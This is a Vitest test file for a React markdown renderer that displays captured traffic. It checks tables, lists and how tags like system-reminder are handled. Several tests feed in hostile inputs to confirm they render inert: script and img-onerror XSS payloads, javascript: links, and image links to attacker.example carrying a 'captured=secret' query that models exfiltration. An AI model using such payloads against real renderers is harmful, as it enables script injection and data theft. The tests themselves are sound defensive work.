// @vitest-environment jsdom

import { act } from "react";
import { createRoot } from "react-dom/client";
import { afterEach, describe, expect, it } from "vitest";

import { MarkdownProse } from "./Markdown";

(globalThis as typeof globalThis & { IS_REACT_ACT_ENVIRONMENT: boolean }).IS_REACT_ACT_ENVIRONMENT = true;

const mounts: Array<{ root: ReturnType<typeof createRoot>; container: HTMLDivElement }> = [];

async function mountMarkdown(text: string): Promise<HTMLDivElement> {
  const container = document.createElement("div");
  document.body.appendChild(container);
  const root = createRoot(container);
  mounts.push({ root, container });
  await act(async () => root.render(<MarkdownProse text={text} />));
  return container;
}

afterEach(async () => {
  for (const mounted of mounts.splice(0)) {
    await act(async () => mounted.root.unmount());
    mounted.container.remove();
  }
});

describe("MarkdownProse", () => {
  it("renders headings, lists, emphasis, inline code, fenced code, and links", async () => {
    const container = await mountMarkdown(
      [
        "# Title",
        "",
        "Some **bold** and *italic* and `inline()` text.",
        "",
        "- first",
        "- second",
        "",
        "```py",
        "print('fenced')",
        "```",
        "",
        "[docs](https://example.test/docs)",
      ].join("\n"),
    );
    expect(container.querySelector("h1")?.textContent).toBe("Title");
    expect(container.querySelector("strong")?.textContent).toBe("bold");
    expect(container.querySelector("em")?.textContent).toBe("italic");
    expect(container.querySelectorAll("li")).toHaveLength(2);
    expect(container.querySelector("p > code")?.textContent).toBe("inline()");
    expect(container.querySelector("pre code")?.textContent).toContain("print('fenced')");
    const link = container.querySelector("a");
    expect(link?.getAttribute("href")).toBe("https://example.test/docs");
    expect(link?.getAttribute("target")).toBe("_blank");
    expect(link?.getAttribute("rel")).toBe("noopener noreferrer");
  });

  it("never passes raw HTML through: script/style/event-handler markup renders inert", async () => {
    const container = await mountMarkdown(
      'before <script>window.__markdown_pwned = true;</script> <img src="x" onerror="window.__markdown_pwned = true"> after',
    );
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("img")).toBeNull();
    expect((globalThis as unknown as Record<string, unknown>).__markdown_pwned).toBeUndefined();
    // Surrounding prose still renders.
    expect(container.textContent).toContain("before");
    expect(container.textContent).toContain("after");
  });

  it("strips javascript: URLs from markdown links", async () => {
    const container = await mountMarkdown("[click me](javascript:window.__markdown_pwned=true)");
    const link = container.querySelector("a");
    expect(link).not.toBeNull();
    expect(link?.getAttribute("href") ?? "").not.toContain("javascript:");
  });

  it("never renders images: markdown img emits no element that could fire a network request", async () => {
    // Captured traffic is attacker-controlled; an <img> would auto-request
    // the remote URL and exfiltrate data. The image renders as inert code.
    const container = await mountMarkdown("![tracking pixel](https://attacker.example/pixel?captured=secret)");
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelectorAll("[src]")).toHaveLength(0);
    // The URL stays visible as text so no information is lost.
    expect(container.querySelector("code.md-img")?.textContent).toContain("https://attacker.example/pixel?captured=secret");
    expect(container.querySelector("code.md-img")?.textContent).toContain("tracking pixel");
  });

  it("keeps the captured image URL and title visible as inert text — even for unsafe URLs", async () => {
    // NO-INFORMATION-LOSS: the unsafe URL and the title are captured
    // evidence. They must be SHOWN (as text) while never producing an
    // element that could fetch or execute anything.
    const container = await mountMarkdown('![tracking](javascript:alert%281%29 "captured title")');
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelectorAll("[src]")).toHaveLength(0);
    const inert = container.querySelector("code.md-img");
    expect(inert?.textContent).toContain("tracking");
    expect(inert?.textContent).toContain("javascript:alert%281%29");
    expect(inert?.textContent).toContain("captured title");
    expect((globalThis as unknown as Record<string, unknown>).__markdown_pwned).toBeUndefined();
  });

  it("renders GFM pipe tables as an HTML table with header + body rows, wrapped for scroll", async () => {
    const container = await mountMarkdown(
      [
        "| Thought | Reality |",
        "|---------|---------|",
        "| A       | B       |",
        "| C       | D       |",
      ].join("\n"),
    );
    const wrap = container.querySelector(".md-table-wrap");
    expect(wrap).not.toBeNull();
    const table = container.querySelector("table");
    expect(table).not.toBeNull();
    const headers = container.querySelectorAll("thead th");
    expect(headers.length).toBe(2);
    expect(headers[0].textContent).toBe("Thought");
    expect(headers[1].textContent).toBe("Reality");
    const rows = container.querySelectorAll("tbody tr");
    expect(rows.length).toBe(2);
  });

  it("renders GFM strikethrough and task-list checkboxes", async () => {
    const container = await mountMarkdown(
      ["~~gone~~", "", "- [x] done", "- [ ] pending"].join("\n"),
    );
    expect(container.querySelector("del")?.textContent).toBe("gone");
    const boxes = container.querySelectorAll<HTMLInputElement>("input[type='checkbox']");
    expect(boxes.length).toBe(2);
    expect(boxes[0].checked).toBe(true);
    expect(boxes[1].checked).toBe(false);
  });

  it("renders captured XML/HTML-y tags as literal visible text instead of dropping them", async () => {
    const container = await mountMarkdown(
      "<system-reminder>hook fired</system-reminder> and <persisted-output>x</persisted-output>",
    );
    // Tags must NOT create real DOM elements.
    expect(container.querySelector("system-reminder")).toBeNull();
    expect(container.querySelector("persisted-output")).toBeNull();
    // The literal tag text is visible, angle brackets intact.
    expect(container.textContent).toContain("<system-reminder>");
    expect(container.textContent).toContain("</system-reminder>");
    expect(container.textContent).toContain("<persisted-output>");
    expect(container.textContent).toContain("hook fired");
  });

  it("keeps inner markdown live when a multi-line captured tag wraps prose (tags escape at string level, not mdast)", async () => {
    // The captured shape that broke on real traffic: block-level opening
    // tag, inner markdown on subsequent lines, then closing tag. Pre-parse
    // escaping must let the inner **markdown** parse normally instead of
    // being swallowed into an opaque HTML block.
    const container = await mountMarkdown(
      [
        "<system-reminder>",
        "",
        "Some **bold** and `code` here.",
        "",
        "- one",
        "- two",
        "",
        "</system-reminder>",
      ].join("\n"),
    );
    // Angle brackets stay visible as literal text.
    expect(container.textContent).toContain("<system-reminder>");
    expect(container.textContent).toContain("</system-reminder>");
    expect(container.querySelector("system-reminder")).toBeNull();
    // Inner markdown renders — not swallowed by the surrounding tag.
    expect(container.querySelector("strong")?.textContent).toBe("bold");
    expect(container.querySelector("code")?.textContent).toBe("code");
    expect(container.querySelectorAll("li")).toHaveLength(2);
  });

  it("does not escape angle-bracket text inside fenced code blocks", async () => {
    // Fenced code preserves the literal captured text — pre-escape must
    // skip it or code samples get double-escaped and lose fidelity.
    const container = await mountMarkdown(
      ["```", "<system-reminder>", "raw content", "</system-reminder>", "```"].join("\n"),
    );
    const code = container.querySelector("pre code");
    expect(code).not.toBeNull();
    expect(code?.textContent).toContain("<system-reminder>");
    expect(code?.textContent).not.toContain("&lt;");
    expect(code?.textContent).toContain("raw content");
  });

  it("does not escape angle-bracket text inside inline code spans", async () => {
    const container = await mountMarkdown("inline `<foo>` tag");
    const inline = container.querySelector("p > code");
    expect(inline?.textContent).toBe("<foo>");
  });

  it("keeps reference-definition and nested images inert with safe link attributes", async () => {
    const container = await mountMarkdown([
      "![tracking][pixel]",
      "",
      "[![nested][nested-pixel]](https://safe.example/docs \"reference link\")",
      "",
      "[nested-pixel]: https://attacker.example/nested.png \"nested title\"",
      "[pixel]: https://attacker.example/pixel.png \"captured title\"",
    ].join("\n"));
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelectorAll("[src]")).toHaveLength(0);
    const inert = container.querySelectorAll("code.md-img");
    expect(inert).toHaveLength(2);
    expect(inert[0].textContent).toContain("https://attacker.example/pixel.png");
    expect(inert[0].textContent).toContain("captured title");
    expect(inert[1].textContent).toContain("https://attacker.example/nested.png");
    expect(inert[1].textContent).toContain("nested title");
    const link = container.querySelector("a");
    expect(link?.getAttribute("href")).toBe("https://safe.example/docs");
    expect(link?.getAttribute("target")).toBe("_blank");
    expect(link?.getAttribute("rel")).toBe("noopener noreferrer");
  });
});
